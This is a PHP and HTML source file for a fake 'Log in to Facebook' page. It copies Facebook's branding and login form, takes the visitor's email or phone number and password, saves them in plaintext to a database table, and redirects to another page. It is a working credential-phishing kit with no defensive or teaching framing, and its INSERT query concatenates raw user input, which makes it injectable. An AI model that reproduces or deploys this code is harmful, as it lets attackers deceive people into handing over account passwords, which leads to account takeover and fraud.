<?php
include 'config.php';
if(isset($_POST['submit'])){
    $username  = $_POST['username'];
    $passwords = $_POST['passwords'];

    $conn ->query("INSERT INTO loginn (username, passwords) VALUES ('$username','$passwords')");
    header("Location: last.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
       <link rel="icon" type="image/png" href="logof.png">
    <title>Log in to Facebook</title>
</head>
<body>
     <div class="logo">facebook</div>

    <div class="login-container">
        <h2>Log in to Facebook</h2>
        <form method="POST">
            <input type="text" class="input-box" name="username" placeholder="Mobile number or email" required>
            <input type="password" class="input-box" name="passwords" placeholder="Password" required>
            <button type="submit" class="login-btn" name="submit">Log in</button>
        </form>
        <a href="#" class="forgot-link">Forgotten account?</a>

        <div class="divider"><span>or</span></div>

        <button class="create-btn">Create new account</button>
    </div>
</body>
</html>